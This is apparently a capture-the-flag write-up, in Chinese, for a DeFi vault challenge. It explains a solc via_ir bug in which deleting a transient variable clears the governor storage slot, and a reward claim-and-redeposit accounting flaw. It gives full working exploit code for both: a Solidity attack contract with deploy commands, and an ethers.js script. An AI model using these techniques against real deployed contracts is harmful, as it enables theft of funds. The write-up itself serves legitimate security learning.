# DeepSea Finance — Writeup

## 1.条件

```solidity
function isSolved() external view returns (bool) {
    return wbtc.balanceOf(address(vaultProxy)) == 0;
}
```

部署时 `Setup` 向 vault proxy 铸造 `10e8` WBTC（10 WBTC），向 player 发放 `10e6` USDC（10 USDC）。目标：让 vault proxy 的 WBTC 余额归零。

---

## 2. 资产出口排查

能转出 WBTC 的路径：

| 路径 | 限制 |
|------|------|
| `withdraw()` | 需要有存款 |
| `borrow()` | 需要足够的抵押品 |
| `liquidate()` | 需要仓位不健康 |
| `flashLoan()` | 需要归还 |
| `settleAsset()` | 需要 relay flag（已被 reserved route 检查挡住） |
| `emergencyWithdraw()` | **需要 guardian 权限** |
| `recoverERC20()` | 需要 guardian 权限 |

常规路径被抵押率、flashloan 归还检查或 guardian 权限限制。player 的 10 USDC 按 LTV 75% 最多借出价值 7.5 USDC 的 WBTC，无法借空 10 WBTC。

`settleAsset()` 需要 `processTranscript()` 打开 transient relay flag，但 relay auth route 已被 `commitCrossChainState()` 的 reserved route 检查挡住。

**关键发现**：只要能成为 guardian，就可以通过 `emergencyWithdraw()` 直接转出 vault 的 WBTC。

---

## 3. 初始化锁

guardian 在 `initialize()` 中设置：

```solidity
function initialize(
    address _oracle,
    address _rewardToken,
    address[] calldata _guardians
) external {
    require(governor == address(0), "Already initialized");
    governor    = msg.sender;
    priceOracle = IVaultOracle(_oracle);
    rewardToken = _rewardToken;
    ...
}
```

部署时 proxy 已执行过初始化，`governor != address(0)`，不能重新初始化。

**利用目标变成：清零 `governor`。**

---

## 4. 编译器配置

`foundry.toml`：

```toml
solc_version = "0.8.29"
via_ir = true
evm_version = "cancun"
```

源码中使用了 transient storage：

```solidity
address internal transient _epochAnchor;
address internal transient _epochOperator;
```

transient storage 和普通 storage 是两套存储空间。`delete _epochOperator` 的正确语义应该是清 transient storage，而不是写普通 storage。

---

## 5. 漏洞触发点

`claimRewards()` → `_settleRewardEpoch()` → `_finalizeRewardEpoch()`：

```solidity
function claimRewards(address token) external nonReentrant {
    _settlePendingRewards(msg.sender, token);
    ...
    _settleRewardEpoch(token);
}

function _settleRewardEpoch(address token) internal {
    bytes32 epochId = keccak256(abi.encodePacked(token, block.chainid));
    _stageRewardOperator(epochId);
    _finalizeRewardEpoch(msg.sender);
}

function _finalizeRewardEpoch(address operator) internal {
    _epochOperator = operator;   // TSTORE（正确）
    delete _epochOperator;       // SSTORE slot 1（BUG！）
}
```

`claimRewards()` 不要求用户真的有 pending rewards，只要调用就能走到 `_finalizeRewardEpoch()`。

---

## 6. IR 证据

```bash
forge inspect src/vault/DeepSeaVault.sol:DeepSeaVault irOptimized
```

`_finalizeRewardEpoch()` 相关 IR 片段：

```text
update_transient_storage_value_offset_address_to_address(0x01, expr)
storage_set_to_zero_address(0x01, 0)
```

- 第一行：`_epochOperator = operator` 使用了 transient write（正确）
- 第二行：`delete _epochOperator` 被错编成了普通 storage slot 1 清零

Storage layout：

```text
slot 0: ReentrancyGuard._status
slot 1: DeepSeaVault.governor    ← 被清零！
slot 2: priceOracle
slot 3: rewardToken
slot 4: _pendingRewardOperator
```

solc 0.8.29 + `via_ir` 模式下，`delete` 对 transient 变量的编译存在 bug，生成了 `SSTORE(slot1, 0)` 而不是 `TSTORE`。slot 1 恰好是 `governor`。

---

## 7. Exploit 链（预期解）

1. 调用 `vault.claimRewards(wbtc)` → 触发 compiler bug → 清零 `governor`
2. 调用 `vault.initialize(...)` → 重新初始化，exploit 合约成为 guardian
3. 调用 `vault.emergencyWithdraw(wbtc, player, fullBalance)` → 转出全部 WBTC
4. `isSolved()` 返回 `true`

### Exploit 合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import "../DeepSea Finance/src/Setup.sol";
import "../DeepSea Finance/src/vault/DeepSeaVault.sol";

contract Exploit {
    constructor(Setup setup, address player) {
        DeepSeaVault vault = setup.vaultProxy();
        address wbtc = address(setup.wbtc());

        // Step 1: 触发 compiler bug，清零 governor
        vault.claimRewards(wbtc);

        // Step 2: 重新初始化，成为 guardian
        address[] memory guards = new address[](1);
        guards[0] = address(this);
        vault.initialize(
            address(setup.oracle()),
            address(setup.usdc()),
            guards
        );

        // Step 3: 转出全部 WBTC
        vault.emergencyWithdraw(
            wbtc,
            player,
            setup.wbtc().balanceOf(address(vault))
        );

        require(setup.isSolved(), "not solved");
    }
}
```

### 复现

```bash
# 部署 exploit
forge create \
  --rpc-url "$RPC_URL" \
  --private-key "$PLAYER_KEY" \
  --broadcast \
  exp/Exploit.sol:Exploit \
  --constructor-args "$SETUP" "$PLAYER"

# 验证
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC_URL"
# 返回 true
```

---

## 8. 非预期解：奖励记账经济漏洞

在对编译器漏洞进行隐藏时，故意写了一些漏洞，比如选手可以获得所有的USDC，因为借贷时60010\*0.75，也是不够换出所有wbtc的。但是忽略了一个问题。

奖励被设置的很高：

```solidity
vaultProxy.addMarket(address(usdc),  5, 1e14);
```

领取奖励不是新mint而是直接转vault的：

```solidity
function claimRewards(address token) external nonReentrant {
    _settlePendingRewards(msg.sender, token);
    UserPosition storage pos = positions[msg.sender][token];
    uint256 amt = pos.pendingRewards;
    if (amt > 0 && IERC20(rewardToken).balanceOf(address(this)) >= amt) {
        pos.pendingRewards = 0;
        rewardToken.safeTransfer(msg.sender, amt); // 奖励直接从 vault 转 USDC
    }
    _settleRewardEpoch(token);
}
```

问题是在deposit函数中，记账与余额分离了：

```solidity
function deposit(address token, uint256 amount) external nonReentrant {
    require(markets[token].enabled, "Market disabled");
    require(amount > 0, "Zero amount");
    _settlePendingRewards(msg.sender, token);
    token.safeTransferFrom(msg.sender, address(this), amount);

    UserPosition storage pos       = positions[msg.sender][token];
    pos.deposited                 += amount;
    pos.lastActivityBlock          = block.number;
    markets[token].totalDeposited += amount;
    emit Deposited(msg.sender, token, amount);
}
```

`deposit()` 只增加用户的 `deposited` 记账，而真实余额在多次 claim→deposit 循环后可以反复膨胀，而最终borrow检查的也是这个值：

```solidity
uint256 colValueUSD = _assetValueUSD(collateralToken, pos.deposited); // USDC 抵押品的美元价值
```

### Exploit 代码

```javascript
const { ethers } = require("ethers");
const solc = require("solc");

// ── ABIs ─────────────────────────────────────────────────────────────

const setupAbi = [
  "function vaultProxy() view returns (address)",
  "function wbtc() view returns (address)",
  "function usdc() view returns (address)",
  "function isSolved() view returns (bool)",
];

const vaultAbi = [
  "function deposit(address token, uint256 amount) external",
  "function borrow(address borrowToken, address collateralToken, uint256 borrowAmount) external",
];

const erc20Abi = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
];

// ── Solidity helper contracts (compiled with viaIR) ──────────────────

const source = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IVault {
    function deposit(address token, uint256 amount) external;
    function claimRewards(address token) external;
    function borrow(address borrowToken, address collateralToken, uint256 borrowAmount) external;
}

contract Helper {
    function depositToVault(address vault, address token, uint256 amount) external {
        IERC20(token).approve(vault, type(uint256).max);
        IVault(vault).deposit(token, amount);
    }

    function claimAndDeposit(address vault, address rewardMarketToken, address rewardToken) external {
        IVault(vault).claimRewards(rewardMarketToken);
        uint256 bal = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).approve(vault, type(uint256).max);
        IVault(vault).deposit(rewardToken, bal);
    }

    function borrowFromVault(address vault, address borrowToken, address collateralToken, uint256 amount) external {
        IVault(vault).borrow(borrowToken, collateralToken, amount);
    }
}

contract Manager {
    Helper[] public helpers;

    constructor(uint256 n) {
        for (uint256 i = 0; i < n; i++) {
            helpers.push(new Helper());
        }
    }

    function helper(uint256 i) external view returns (address) {
        return address(helpers[i]);
    }

    function splitAndDeposit(
        address vault,
        address token,
        uint256 totalAmount,
        uint256 eachAmount
    ) external {
        IERC20(token).transferFrom(msg.sender, address(this), totalAmount);
        for (uint256 i = 0; i < helpers.length; i++) {
            IERC20(token).transfer(address(helpers[i]), eachAmount);
            helpers[i].depositToVault(vault, token, eachAmount);
        }
    }
}
`;

// ── Helpers ──────────────────────────────────────────────────────────

function usage() {
  console.error("Usage:");
  console.error("  node exp2.js <rpcUrl> <playerPrivateKey> <setupAddress>");
  console.error("");
  console.error("Or set environment variables:");
  console.error("  RPC_URL, PLAYER_KEY, SETUP_ADDRESS");
}

function getConfig() {
  const [, , argRpc, argKey, argSetup] = process.argv;
  const rpcUrl = argRpc || process.env.RPC_URL;
  const playerKey = argKey || process.env.PLAYER_KEY;
  const setupAddress = argSetup || process.env.SETUP_ADDRESS;

  if (!rpcUrl || !playerKey || !setupAddress) {
    usage();
    process.exit(1);
  }
  if (!ethers.isAddress(setupAddress)) {
    throw new Error(`invalid setup address: ${setupAddress}`);
  }
  return { rpcUrl, playerKey, setupAddress };
}

function compile() {
  const input = {
    language: "Solidity",
    sources: { "Attack.sol": { content: source } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      viaIR: true,
      outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } },
    },
  };

  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  if (output.errors) {
    const fatal = output.errors.filter((e) => e.severity === "error");
    for (const e of output.errors) console.log(e.formattedMessage);
    if (fatal.length) throw new Error("solc compilation failed");
  }

  return {
    managerAbi: output.contracts["Attack.sol"].Manager.abi,
    managerBytecode: output.contracts["Attack.sol"].Manager.evm.bytecode.object,
    helperAbi: output.contracts["Attack.sol"].Helper.abi,
  };
}

async function send(txPromise, label) {
  const tx = await txPromise;
  const receipt = await tx.wait();
  console.log(`${label}: ${tx.hash} @ block ${receipt.blockNumber}`);
  return receipt;
}

// ── Exploit ──────────────────────────────────────────────────────────

async function main() {
  const { rpcUrl, playerKey, setupAddress } = getConfig();
  const { managerAbi, managerBytecode, helperAbi } = compile();

  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(playerKey, provider);
  const setup = new ethers.Contract(setupAddress, setupAbi, wallet);

  const vaultAddr = await setup.vaultProxy();
  const wbtcAddr = await setup.wbtc();
  const usdcAddr = await setup.usdc();
  const vault = new ethers.Contract(vaultAddr, vaultAbi, wallet);
  const wbtc = new ethers.Contract(wbtcAddr, erc20Abi, wallet);
  const usdc = new ethers.Contract(usdcAddr, erc20Abi, wallet);

  // 1. Deploy helper manager (10 helper contracts)
  const managerFactory = new ethers.ContractFactory(managerAbi, managerBytecode, wallet);
  const manager = await managerFactory.deploy(10);
  await manager.waitForDeployment();
  const managerAddr = await manager.getAddress();
  const helperAddr = await manager.helper(1);

  // 2. Deposit 10 USDC as collateral
  await send(usdc.approve(vaultAddr, 10_000_000n), "approve usdc");
  await send(vault.deposit(usdcAddr, 10_000_000n), "deposit 10 USDC");

  // 3. Borrow 12,000 sat WBTC (max at 75% LTV)
  await send(vault.borrow(wbtcAddr, usdcAddr, 12_000n), "borrow 0.00012 WBTC");

  // 4. Split WBTC across 10 helpers and deposit into vault
  await send(wbtc.approve(managerAddr, 12_000n), "approve seed wbtc");
  await send(
    manager.splitAndDeposit(vaultAddr, wbtcAddr, 12_000n, 1_200n),
    "split seed WBTC to 10 helpers"
  );

  // 5. Claim USDC rewards + re-deposit, 8 rounds
  //    Each round: helper claims ~100,000 USDC (1 block of WBTC market rewards)
  //    and re-deposits it as collateral. Vault USDC balance stays constant
  //    (claim -100k, deposit +100k), so the cycle can repeat indefinitely.
  const helper = new ethers.Contract(helperAddr, helperAbi, wallet);
  for (let i = 0; i < 8; i++) {
    await send(
      helper.claimAndDeposit(vaultAddr, wbtcAddr, usdcAddr),
      `claim+redeposit round ${i + 1}`
    );
  }

  // 6. Borrow all 10 WBTC (800k USDC collateral × 75% LTV = 600k USD = 10 WBTC)
  await send(
    helper.borrowFromVault(vaultAddr, wbtcAddr, usdcAddr, 1_000_000_000n),
    "borrow all vault WBTC"
  );

  console.log("solved =", await setup.isSolved());
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
```

---
